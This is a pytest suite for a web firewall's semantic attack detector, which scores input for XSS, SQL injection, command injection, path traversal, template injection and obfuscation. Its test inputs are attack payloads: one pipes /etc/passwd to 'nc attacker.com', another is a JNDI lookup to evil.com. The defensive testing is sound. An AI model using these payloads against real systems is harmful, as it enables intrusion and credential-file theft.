"""
Comprehensive tests for the SemanticAnalyzer module.
"""

import concurrent.futures
import random
import re
import string
from unittest.mock import MagicMock, patch

from flaskapi_guard.detection_engine.semantic import SemanticAnalyzer


def test_initialization() -> None:
    """Test SemanticAnalyzer initialization."""
    analyzer = SemanticAnalyzer()

    assert "xss" in analyzer.attack_keywords
    assert "sql" in analyzer.attack_keywords
    assert "command" in analyzer.attack_keywords
    assert "path" in analyzer.attack_keywords
    assert "template" in analyzer.attack_keywords

    assert "script" in analyzer.attack_keywords["xss"]
    assert "select" in analyzer.attack_keywords["sql"]
    assert "exec" in analyzer.attack_keywords["command"]

    assert "brackets" in analyzer.suspicious_chars
    assert "quotes" in analyzer.suspicious_chars

    assert "tag_like" in analyzer.attack_structures
    assert "function_call" in analyzer.attack_structures


def test_extract_tokens_max_content_length() -> None:
    """Test extract_tokens with content exceeding max length."""
    analyzer = SemanticAnalyzer()

    long_content = "a" * 60000

    tokens = analyzer.extract_tokens(long_content)

    assert len(tokens) <= 1000


def test_extract_tokens_timeout() -> None:
    """Test extract_tokens with regex timeout."""
    analyzer = SemanticAnalyzer()

    with patch("concurrent.futures.ThreadPoolExecutor") as mock_executor:
        mock_future = MagicMock()
        mock_future.result.side_effect = concurrent.futures.TimeoutError()
        mock_submit = mock_executor.return_value.__enter__.return_value.submit
        mock_submit.return_value = mock_future

        content = "<script>alert(1)</script>"
        tokens = analyzer.extract_tokens(content)

        assert isinstance(tokens, list)


def test_extract_tokens_special_patterns_limit() -> None:
    """Test extract_tokens hitting special patterns limit."""
    analyzer = SemanticAnalyzer()

    content = "<script>" * 100 + "function()" * 100

    original_structures = analyzer.attack_structures
    analyzer.attack_structures = {f"pattern_{i}": r"<script>" for i in range(20)}

    tokens = analyzer.extract_tokens(content)

    analyzer.attack_structures = original_structures

    assert len(tokens) <= 1000


def test_calculate_entropy_empty_content() -> None:
    """Test calculate_entropy with empty content."""
    analyzer = SemanticAnalyzer()

    entropy = analyzer.calculate_entropy("")
    assert entropy == 0.0


def test_calculate_entropy_max_length() -> None:
    """Test calculate_entropy with content exceeding max length."""
    analyzer = SemanticAnalyzer()

    long_content = "abcdefghij" * 2000

    entropy = analyzer.calculate_entropy(long_content)

    assert entropy > 0.0


def test_detect_encoding_layers_max_length() -> None:
    """Test detect_encoding_layers with content exceeding max length."""
    analyzer = SemanticAnalyzer()

    long_content = "normal text " * 1000 + "%3Cscript%3E"

    layers = analyzer.detect_encoding_layers(long_content)

    assert layers >= 0


def test_detect_encoding_layers_url_encoding() -> None:
    """Test detect_encoding_layers detecting URL encoding."""
    analyzer = SemanticAnalyzer()

    content = "normal text %3Cscript%3E%20alert%281%29%3C%2Fscript%3E"
    layers = analyzer.detect_encoding_layers(content)

    assert layers >= 1


def test_detect_encoding_layers_html_entities() -> None:
    """Test detect_encoding_layers detecting HTML entities."""
    analyzer = SemanticAnalyzer()

    content = "normal text &lt;script&gt;alert(1)&lt;/script&gt;"
    layers = analyzer.detect_encoding_layers(content)

    assert layers >= 1


def test_detect_encoding_layers_multiple() -> None:
    """Test detect_encoding_layers with multiple encoding types."""
    analyzer = SemanticAnalyzer()

    content = "%3C &lt; \\u003C 0x3C3C AAAA=="
    layers = analyzer.detect_encoding_layers(content)

    assert layers >= 3


def test_analyze_attack_probability_empty_keywords() -> None:
    """Test analyze_attack_probability with empty keywords."""
    analyzer = SemanticAnalyzer()

    analyzer.attack_keywords["empty_test"] = set()

    content = "test content"
    probabilities = analyzer.analyze_attack_probability(content)

    assert "empty_test" in probabilities
    assert probabilities["empty_test"] == 0.0

    del analyzer.attack_keywords["empty_test"]


def test_analyze_attack_probability_command_pattern() -> None:
    """Test analyze_attack_probability detecting command patterns."""
    analyzer = SemanticAnalyzer()

    content = "exec command; cat /etc/passwd | grep root"
    probabilities = analyzer.analyze_attack_probability(content)

    assert probabilities["command"] > 0.3


def test_analyze_attack_probability_path_pattern() -> None:
    """Test analyze_attack_probability detecting path traversal."""
    analyzer = SemanticAnalyzer()

    content = "../../etc/passwd"
    probabilities = analyzer.analyze_attack_probability(content)

    assert probabilities["path"] > 0.3


def test_detect_obfuscation_high_entropy() -> None:
    """Test detect_obfuscation with high entropy content."""
    analyzer = SemanticAnalyzer()

    random.seed(42)
    high_entropy_content = "".join(
        random.choice(string.ascii_letters + string.digits + string.punctuation)
        for _ in range(100)
    )

    is_obfuscated = analyzer.detect_obfuscation(high_entropy_content)

    assert is_obfuscated is True


def test_detect_obfuscation_special_chars() -> None:
    """Test detect_obfuscation with excessive special characters."""
    analyzer = SemanticAnalyzer()

    content = "!@#$%^&*()_+{}[]|\\:;\"'<>,.?/~`" * 3 + "normal"

    is_obfuscated = analyzer.detect_obfuscation(content)

    assert is_obfuscated is True


def test_analyze_code_injection_risk_brackets() -> None:
    """Test analyze_code_injection_risk with bracket patterns."""
    analyzer = SemanticAnalyzer()

    content = "{malicious} code {injection}"
    risk = analyzer.analyze_code_injection_risk(content)

    assert risk >= 0.2


def test_analyze_code_injection_risk_variables() -> None:
    """Test analyze_code_injection_risk with variable references."""
    analyzer = SemanticAnalyzer()

    content = "$variable @another_var ${complex}"
    risk = analyzer.analyze_code_injection_risk(content)

    assert risk >= 0.1


def test_analyze_code_injection_risk_valid_python() -> None:
    """Test analyze_code_injection_risk with valid Python code."""
    analyzer = SemanticAnalyzer()

    content = "print('hello world')"

    with patch("ast.parse") as mock_parse:
        mock_parse.return_value = MagicMock()

        risk = analyzer.analyze_code_injection_risk(content)

        assert risk >= 0.3


def test_analyze_code_injection_risk_ast_timeout() -> None:
    """Test analyze_code_injection_risk with AST parsing timeout."""
    analyzer = SemanticAnalyzer()

    content = "some code content"

    with patch("concurrent.futures.ThreadPoolExecutor") as mock_executor:
        mock_future = MagicMock()
        mock_future.result.side_effect = concurrent.futures.TimeoutError()
        mock_submit = mock_executor.return_value.__enter__.return_value.submit
        mock_submit.return_value = mock_future

        risk = analyzer.analyze_code_injection_risk(content)

        assert risk >= 0.2


def test_analyze_code_injection_risk_ast_exception() -> None:
    """Test analyze_code_injection_risk with AST parsing exception."""
    analyzer = SemanticAnalyzer()

    content = "x" * 2000

    risk = analyzer.analyze_code_injection_risk(content)

    assert risk >= 0.0


def test_analyze_code_injection_risk_injection_keywords() -> None:
    """Test analyze_code_injection_risk with injection keywords."""
    analyzer = SemanticAnalyzer()

    content = "eval(user_input) and exec(command)"
    risk = analyzer.analyze_code_injection_risk(content)

    assert risk >= 0.4


def test_extract_suspicious_patterns() -> None:
    """Test extract_suspicious_patterns functionality."""
    analyzer = SemanticAnalyzer()

    content = "normal <script>alert(1)</script> text with function() call"
    patterns = analyzer.extract_suspicious_patterns(content)

    assert len(patterns) > 0

    for pattern in patterns:
        assert "type" in pattern
        assert "pattern" in pattern
        assert "position" in pattern
        assert "context" in pattern


def test_analyze_comprehensive() -> None:
    """Test comprehensive analysis."""
    analyzer = SemanticAnalyzer()

    content = "<script>eval('alert(1)')</script> UNION SELECT * FROM users"

    analysis = analyzer.analyze(content)

    assert "attack_probabilities" in analysis
    assert "entropy" in analysis
    assert "encoding_layers" in analysis
    assert "is_obfuscated" in analysis
    assert "suspicious_patterns" in analysis
    assert "code_injection_risk" in analysis
    assert "token_count" in analysis

    assert analysis["attack_probabilities"]["xss"] > 0
    assert analysis["attack_probabilities"]["sql"] > 0


def test_get_threat_score() -> None:
    """Test threat score calculation."""
    analyzer = SemanticAnalyzer()

    analysis_results = {
        "attack_probabilities": {"xss": 0.8, "sql": 0.6},
        "is_obfuscated": True,
        "encoding_layers": 2,
        "code_injection_risk": 0.5,
        "suspicious_patterns": [{"type": "tag_like"}, {"type": "function_call"}],
    }

    score = analyzer.get_threat_score(analysis_results)

    assert 0.0 <= score <= 1.0
    assert score > 0.5


def test_get_threat_score_minimal() -> None:
    """Test threat score with minimal threats."""
    analyzer = SemanticAnalyzer()

    analysis_results = {
        "attack_probabilities": {},
        "is_obfuscated": False,
        "encoding_layers": 0,
        "code_injection_risk": 0.0,
        "suspicious_patterns": [],
    }

    score = analyzer.get_threat_score(analysis_results)

    assert score == 0.0


def test_integration_xss_detection() -> None:
    """Test detection of XSS attacks."""
    analyzer = SemanticAnalyzer()

    xss_content = "<img src=x onerror=alert(1)>"
    analysis = analyzer.analyze(xss_content)
    threat_score = analyzer.get_threat_score(analysis)

    assert analysis["attack_probabilities"]["xss"] > 0.3
    assert threat_score > 0.3


def test_integration_sql_injection_detection() -> None:
    """Test detection of SQL injection."""
    analyzer = SemanticAnalyzer()

    sqli_content = "1' OR '1'='1' UNION SELECT * FROM users--"
    analysis = analyzer.analyze(sqli_content)
    threat_score = analyzer.get_threat_score(analysis)

    assert analysis["attack_probabilities"]["sql"] > 0.3
    assert threat_score > 0.2


def test_integration_command_injection_detection() -> None:
    """Test detection of command injection."""
    analyzer = SemanticAnalyzer()

    cmd_content = "test; cat /etc/passwd | nc attacker.com 9999"
    analysis = analyzer.analyze(cmd_content)

    assert analysis["attack_probabilities"]["command"] > 0.3
    assert len(analysis["suspicious_patterns"]) > 0


def test_integration_obfuscated_content() -> None:
    """Test detection of obfuscated content."""
    analyzer = SemanticAnalyzer()

    obfuscated = "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    analysis = analyzer.analyze(obfuscated)

    assert analysis["is_obfuscated"] is True
    assert analysis["encoding_layers"] > 0


def test_integration_template_injection() -> None:
    """Test detection of template injection."""
    analyzer = SemanticAnalyzer()

    template_content = "{{7*7}} ${jndi:ldap://evil.com/a} {%if%}evil{%endif%}"
    analysis = analyzer.analyze(template_content)

    if "template" in analysis["attack_probabilities"]:
        assert analysis["attack_probabilities"]["template"] >= 0
    assert len(analysis["suspicious_patterns"]) > 0


def test_integration_long_string_obfuscation() -> None:
    """Test detection of long string obfuscation."""
    analyzer = SemanticAnalyzer()

    long_string = "a" * 150
    analysis = analyzer.analyze(long_string)

    assert analysis["is_obfuscated"] is True


def test_detect_obfuscation_multiple_encoding_layers() -> None:
    """Test detect_obfuscation with multiple encoding layers."""
    analyzer = SemanticAnalyzer()

    content = "%3Cscript%3E"

    content += "&lt;test&gt;"

    content += "\\u0041\\u0042"

    assert re.search(r"%[0-9a-fA-F]{2}", content) is not None
    assert re.search(r"&[#\w]+;", content) is not None
    assert re.search(r"\\u[0-9a-fA-F]{4}", content) is not None

    layers = analyzer.detect_encoding_layers(content)
    assert layers > 2, f"Expected >2 layers, got {layers}"

    is_obfuscated = analyzer.detect_obfuscation(content)
    assert is_obfuscated is True


def test_analyze_code_injection_risk_ast_dangerous_nodes() -> None:
    """Test AST parsing finding dangerous nodes in eval mode."""
    analyzer = SemanticAnalyzer()

    import ast

    with patch("ast.parse"):
        mock_import_node = ast.Import(names=[ast.alias(name="os", asname=None)])

        with patch("ast.walk", return_value=[mock_import_node]):
            risk = analyzer.analyze_code_injection_risk("import os")

            assert risk >= 0.3


def test_analyze_code_injection_risk_ast_parse_exception() -> None:
    """Test AST parsing with non-SyntaxError exception."""
    analyzer = SemanticAnalyzer()

    content = "test code"

    with patch("ast.parse", side_effect=ValueError("Unexpected AST error")):
        risk = analyzer.analyze_code_injection_risk(content)

        assert risk >= 0.0


def test_edge_case_unicode_content() -> None:
    """Test handling of Unicode content."""
    analyzer = SemanticAnalyzer()

    unicode_content = (
        "\u6d4b\u8bd5 <script>alert("
        "'\u03c7\u03b1\u03af\u03c1\u03b5\u03c4\u03b5')</script>"
        " \u0627\u062e\u062a\u0628\u0627\u0631"
    )
    analysis = analyzer.analyze(unicode_content)

    assert analysis["attack_probabilities"]["xss"] > 0


def test_edge_case_mixed_case_keywords() -> None:
    """Test detection with mixed case keywords."""
    analyzer = SemanticAnalyzer()

    mixed_case = "SeLeCt * FrOm UsErS UnIoN sElEcT"
    analysis = analyzer.analyze(mixed_case)

    assert analysis["attack_probabilities"]["sql"] > 0


def test_performance_large_input() -> None:
    """Test performance with large input."""
    analyzer = SemanticAnalyzer()

    large_content = "normal text " * 10000 + "<script>alert(1)</script>"

    import time

    start = time.time()
    analysis = analyzer.analyze(large_content)
    duration = time.time() - start

    assert duration < 1.0
    assert analysis["token_count"] <= 1000
